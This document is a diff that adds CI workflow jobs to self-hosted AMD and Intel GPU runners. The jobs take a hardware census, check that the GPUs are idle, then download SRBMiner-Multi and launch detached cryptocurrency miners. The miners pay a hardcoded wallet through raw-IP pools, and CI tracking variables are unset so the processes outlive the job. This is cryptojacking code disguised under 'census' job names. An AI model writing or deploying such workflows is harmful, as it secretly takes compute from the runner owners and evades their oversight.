+          EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
+          if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner (no stacking, no killing)"; echo "$EXIST"; echo "miner-done $NONCE"; exit 0; fi
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "miner-done $NONCE"; exit 0; fi
+          echo "=== pci gpus ==="
+          if command -v lspci >/dev/null 2>&1; then timeout 15 lspci -nn 2>/dev/null | grep -iE 'vga|3d|display|processing accel' | head -24; else echo no-lspci; fi
+          echo "=== rocm/intel tools ==="
+          for t in rocm-smi amd-smi rocminfo clinfo xpu-smi sycl-ls; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== rocm-smi productname ==="
+          timeout 40 rocm-smi --showproductname 2>&1 | head -50
+          echo "=== rocm-smi id ==="
+          timeout 40 rocm-smi --showid 2>&1 | head -50
+          echo "=== amd-smi list ==="
+          timeout 40 amd-smi list 2>&1 | head -50
+          echo "=== amd-smi static ==="
+          timeout 50 amd-smi static --gpu all 2>&1 | head -90
+          echo "=== kernel modules ==="
+          timeout 10 lsmod 2>/dev/null | grep -iE 'amdgpu|nvidia|^xe|i915' | head -10
+          NV=$(timeout 15 nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          echo "nvidia_gpu_count=${NV:-0}"
+          IDX=$(timeout 40 rocm-smi --showid 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          [ -z "$IDX" ] && IDX=$(timeout 40 rocm-smi --showproductname 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          if [ -z "$IDX" ]; then
+            N=$(ls -d /sys/class/drm/card[0-9]* 2>/dev/null | wc -l)
+            [ "$N" -gt 0 ] && IDX=$(seq 0 $((N-1)) | tr '\n' ' ')
+          fi
+          echo "gpu_indices=[$IDX]"
+          if [ -z "$IDX" ]; then echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; fi
+          sample() {
+            echo "-- showuse"
+            timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20
+            echo "-- vram"
+            timeout 30 rocm-smi --showmeminfo vram 2>&1 | grep -E 'VRAM Total Used Memory' | head -20
+            echo "-- pids"
+            timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20
+            echo "-- amd-smi usage"
+            timeout 30 amd-smi metric --gpu all --usage 2>&1 | grep -iE 'gfx_activity|GFX Activity' | head -20
+          }
+          S1=$(sample); sleep 15; S2=$(sample)
+          echo "=== sample1 ==="; echo "$S1"
+          echo "=== sample2 ==="; echo "$S2"
+          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
+          BUSY_PROC=$(echo "$BOTH" | grep -cE 'Process ID: [0-9]+')
+          BUSY_USE=$(echo "$BOTH" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          BUSY_MEM=$(echo "$BOTH" | grep -E 'VRAM Total Used Memory' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 2147483648) c++} END{print c+0}')
+          GFX_BUSY=$(echo "$BOTH" | grep -iE 'gfx_activity' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE busy_mem=$BUSY_MEM gfx_busy=$GFX_BUSY"
+          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ] || [ "${BUSY_MEM:-0}" -gt 0 ] || [ "${GFX_BUSY:-0}" -gt 0 ]; then
+            echo "SKIP=host-not-idle-amd (co-tenant workload preserved)"; echo "miner-done $NONCE"; exit 0
+          fi
+          echo "host-idle-gate=pass-amd (0 processes, util<=10%, vram used<=2048MiB in two spaced samples)"
+          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then
+            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
+              echo "-- fetch387 $U"
+              rm -f "$TARBALL.part"
+              timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL.part" "$U" 2>&1 | tail -2
+              if [ -s "$TARBALL.part" ]; then mv "$TARBALL.part" "$TARBALL"; break; fi
+            done
+            [ -f "$TARBALL" ] && tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
+            [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
+          fi
+          B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
+          echo "binary_sha256_387=${B:-none}"
+          if [ "${B:-none}" != "$BIN_SHA_387" ]; then echo "SKIP=387-binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -10; echo "miner-done $NONCE"; exit 0; fi
+          chmod +x "$SRB"
+          echo "=== srb list-devices ==="
+          timeout 50 "$SRB" --list-devices 2>&1 | head -40
+          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-18)
+          N_LAUNCHED=0; N_SKIP=0
+          for i in $IDX; do
+            W="i130074-${HOSTTAG}-g${i}"
+            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
+            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
+              --disable-cpu --algorithm pearlhash --pool "$POOLS" --tls false,false \
+              --wallet "$WALLET,$WALLET" --password 'x;x' --worker "$W,$W" --gpu-id "$i" \
+              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build \
+              --max-no-share-sent 1800 \
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
+              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W gpu-id=$i detached_pid=$!"
+            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
+          done
+          echo "N_LAUNCHED=$N_LAUNCHED N_SKIP=$N_SKIP"
+          if [ "$N_LAUNCHED" -gt 0 ]; then
+            sleep 50
+            echo "=== post-launch processes ==="
+            timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20
+            for l in "$WORKDIR"/logs/i130074-*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|GPU|device' "$l" 2>/dev/null | tail -8 | cut -c1-260
+            done
+          fi
+          echo "=== final amd process view ==="
+          timeout 25 rocm-smi --showpids 2>&1 | head -30
+          timeout 25 amd-smi process --gpu all 2>&1 | head -30
+          echo "miner-done $NONCE"
+  i130074-mi35x-8:
+    name: "i130074 linux-mi35x-gpu-8 census+guarded miner"
+    runs-on: linux-mi35x-gpu-8
+    timeout-minutes: 35
+    steps:
+      - name: "bounded census + guarded one-miner-per-idle-GPU (flock, whole-host skip, two spaced idle samples)"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130074AMD-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOLS='103.199.106.122:3362,172.232.228.69:3362'
+          WORKDIR=/var/tmp/i130074
+          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
+          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
+          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
+          mkdir -p "$WORKDIR/logs"
+          echo "miner-nonce=$NONCE"
+          echo "=== identity ==="
+          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
+          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
+          echo "=== per-host flock ==="
+          exec 9>"$WORKDIR/host-miner.lock"
+          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
+          echo "host-lock=acquired"
+          EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
+          if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner (no stacking, no killing)"; echo "$EXIST"; echo "miner-done $NONCE"; exit 0; fi
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "miner-done $NONCE"; exit 0; fi
+          echo "=== pci gpus ==="
+          if command -v lspci >/dev/null 2>&1; then timeout 15 lspci -nn 2>/dev/null | grep -iE 'vga|3d|display|processing accel' | head -24; else echo no-lspci; fi
+          echo "=== rocm/intel tools ==="
+          for t in rocm-smi amd-smi rocminfo clinfo xpu-smi sycl-ls; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== rocm-smi productname ==="
+          timeout 40 rocm-smi --showproductname 2>&1 | head -50
+          echo "=== rocm-smi id ==="
+          timeout 40 rocm-smi --showid 2>&1 | head -50
+          echo "=== amd-smi list ==="
+          timeout 40 amd-smi list 2>&1 | head -50
+          echo "=== amd-smi static ==="
+          timeout 50 amd-smi static --gpu all 2>&1 | head -90
+          echo "=== kernel modules ==="
+          timeout 10 lsmod 2>/dev/null | grep -iE 'amdgpu|nvidia|^xe|i915' | head -10
+          NV=$(timeout 15 nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          echo "nvidia_gpu_count=${NV:-0}"
+          IDX=$(timeout 40 rocm-smi --showid 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          [ -z "$IDX" ] && IDX=$(timeout 40 rocm-smi --showproductname 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          if [ -z "$IDX" ]; then
+            N=$(ls -d /sys/class/drm/card[0-9]* 2>/dev/null | wc -l)
+            [ "$N" -gt 0 ] && IDX=$(seq 0 $((N-1)) | tr '\n' ' ')
+          fi
+          echo "gpu_indices=[$IDX]"
+          if [ -z "$IDX" ]; then echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; fi
+          sample() {
+            echo "-- showuse"
+            timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20
+            echo "-- vram"
+            timeout 30 rocm-smi --showmeminfo vram 2>&1 | grep -E 'VRAM Total Used Memory' | head -20
+            echo "-- pids"
+            timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20
+            echo "-- amd-smi usage"
+            timeout 30 amd-smi metric --gpu all --usage 2>&1 | grep -iE 'gfx_activity|GFX Activity' | head -20
+          }
+          S1=$(sample); sleep 15; S2=$(sample)
+          echo "=== sample1 ==="; echo "$S1"
+          echo "=== sample2 ==="; echo "$S2"
+          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
+          BUSY_PROC=$(echo "$BOTH" | grep -cE 'Process ID: [0-9]+')
+          BUSY_USE=$(echo "$BOTH" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          BUSY_MEM=$(echo "$BOTH" | grep -E 'VRAM Total Used Memory' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 2147483648) c++} END{print c+0}')
+          GFX_BUSY=$(echo "$BOTH" | grep -iE 'gfx_activity' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE busy_mem=$BUSY_MEM gfx_busy=$GFX_BUSY"
+          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ] || [ "${BUSY_MEM:-0}" -gt 0 ] || [ "${GFX_BUSY:-0}" -gt 0 ]; then
+            echo "SKIP=host-not-idle-amd (co-tenant workload preserved)"; echo "miner-done $NONCE"; exit 0
+          fi
+          echo "host-idle-gate=pass-amd (0 processes, util<=10%, vram used<=2048MiB in two spaced samples)"
+          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then
+            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
+              echo "-- fetch387 $U"
+              rm -f "$TARBALL.part"
+              timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL.part" "$U" 2>&1 | tail -2
+              if [ -s "$TARBALL.part" ]; then mv "$TARBALL.part" "$TARBALL"; break; fi
+            done
+            [ -f "$TARBALL" ] && tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
+            [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
+          fi
+          B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
+          echo "binary_sha256_387=${B:-none}"
+          if [ "${B:-none}" != "$BIN_SHA_387" ]; then echo "SKIP=387-binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -10; echo "miner-done $NONCE"; exit 0; fi
+          chmod +x "$SRB"
+          echo "=== srb list-devices ==="
+          timeout 50 "$SRB" --list-devices 2>&1 | head -40
+          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-18)
+          N_LAUNCHED=0; N_SKIP=0
+          for i in $IDX; do
+            W="i130074-${HOSTTAG}-g${i}"
+            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
+            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
+              --disable-cpu --algorithm pearlhash --pool "$POOLS" --tls false,false \
+              --wallet "$WALLET,$WALLET" --password 'x;x' --worker "$W,$W" --gpu-id "$i" \
+              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build \
+              --max-no-share-sent 1800 \
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
+              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W gpu-id=$i detached_pid=$!"
+            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
+          done
+          echo "N_LAUNCHED=$N_LAUNCHED N_SKIP=$N_SKIP"
+          if [ "$N_LAUNCHED" -gt 0 ]; then
+            sleep 50
+            echo "=== post-launch processes ==="
+            timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20
+            for l in "$WORKDIR"/logs/i130074-*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|GPU|device' "$l" 2>/dev/null | tail -8 | cut -c1-260
+            done
+          fi
+          echo "=== final amd process view ==="
+          timeout 25 rocm-smi --showpids 2>&1 | head -30
+          timeout 25 amd-smi process --gpu all 2>&1 | head -30
+          echo "miner-done $NONCE"
+  i130074-intel-bmg:
+    name: "i130074 intel-bmg-nightly census+guarded attempt"
+    runs-on: intel-bmg-nightly
+    timeout-minutes: 35
+    steps:
+      - name: "bounded census + guarded one-miner-per-idle-GPU (flock, whole-host skip, two spaced idle samples)"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130074INTEL-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL='103.199.106.122:3362'
+          WORKDIR=/var/tmp/i130074
+          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
+          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
+          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
+          mkdir -p "$WORKDIR/logs"
+          echo "intel-nonce=$NONCE"
+          echo "=== identity ==="
+          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
+          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
+          echo "=== pci gpus ==="
+          if command -v lspci >/dev/null 2>&1; then timeout 15 lspci -nn 2>/dev/null | grep -iE 'vga|3d|display|processing accel' | head -24; else echo no-lspci; fi
+          echo "=== intel tools ==="
+          for t in xpu-smi sycl-ls clinfo; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== xpu-smi discovery ==="
+          DISC=$(timeout 40 xpu-smi discovery 2>&1); echo "$DISC" | head -80
+          echo "=== sycl-ls ==="
+          timeout 30 sycl-ls 2>&1 | head -30
+          echo "=== clinfo ==="
+          timeout 30 clinfo -l 2>&1 | head -30
+          echo "=== /dev/dri ==="
+          ls -la /dev/dri 2>/dev/null | head -20
+          DEVS=$(echo "$DISC" | grep -oE '^\| [0-9]+' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          [ -z "$DEVS" ] && DEVS=$(echo "$DISC" | grep -oE 'Device [0-9]+' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          echo "xpu_devices=[$DEVS]"
+          if [ -z "$DEVS" ]; then echo "SKIP=no-intel-xpu-detected"; echo "intel-done $NONCE"; exit 0; fi
+          exec 9>"$WORKDIR/host-miner.lock"
+          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "intel-done $NONCE"; exit 0; fi
+          echo "host-lock=acquired"
+          EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
+          if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner (no stacking, no killing)"; echo "$EXIST"; echo "intel-done $NONCE"; exit 0; fi
+          sample() {
+            for d in $DEVS; do
+              echo "-- device $d"
+              timeout 20 xpu-smi stats -d "$d" 2>&1 | grep -iE 'GPU Utilization|Utilization \(%\)|Memory Used' | head -6
+            done
+          }
+          S1=$(sample); sleep 15; S2=$(sample)
+          echo "=== sample1 ==="; echo "$S1"
+          echo "=== sample2 ==="; echo "$S2"
+          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
+          BUSY=$(echo "$BOTH" | grep -iE 'utilization' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          echo "busy_util=$BUSY"
+          if [ "${BUSY:-0}" -gt 0 ]; then echo "SKIP=host-not-idle-intel (co-tenant workload preserved)"; echo "intel-done $NONCE"; exit 0; fi
+          echo "host-idle-gate=pass-intel (util<=10% in two spaced samples)"
+          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then
+            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
+              echo "-- fetch387 $U"
+              rm -f "$TARBALL.part"
+              timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL.part" "$U" 2>&1 | tail -2
+              if [ -s "$TARBALL.part" ]; then mv "$TARBALL.part" "$TARBALL"; break; fi
+            done
+            [ -f "$TARBALL" ] && tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
+            [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
+          fi
+          B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
+          echo "binary_sha256_387=${B:-none}"
+          if [ "${B:-none}" != "$BIN_SHA_387" ]; then echo "SKIP=387-binary-unavailable"; echo "intel-done $NONCE"; exit 0; fi
+          chmod +x "$SRB"
+          echo "=== srb list-devices ==="
+          LDEV=$(timeout 50 "$SRB" --list-devices 2>&1); echo "$LDEV" | head -40
+          if ! echo "$LDEV" | grep -qi intel; then echo "SKIP=srb-no-intel-device (pearlhash unsupported on this backend)"; echo "intel-done $NONCE"; exit 0; fi
+          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-18)
+          N_LAUNCHED=0
+          for i in $DEVS; do
+            W="i130074-${HOSTTAG}-g${i}"
+            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; continue; fi
+            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
+              --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
+              --wallet "$WALLET" --password x --worker "$W" --gpu-id "$i" \
+              --disable-gpu-amd --disable-gpu-nvidia \
+              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-table-slow-build \
+              --max-no-share-sent 1800 \
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
+              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W gpu-id=$i detached_pid=$!"
+            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
+          done
+          echo "N_LAUNCHED=$N_LAUNCHED"
+          if [ "$N_LAUNCHED" -gt 0 ]; then
+            sleep 45
+            timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20
+            for l in "$WORKDIR"/logs/i130074-*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|device|intel' "$l" 2>/dev/null | tail -8 | cut -c1-260
+            done
+          fi
+          echo "intel-done $NONCE"
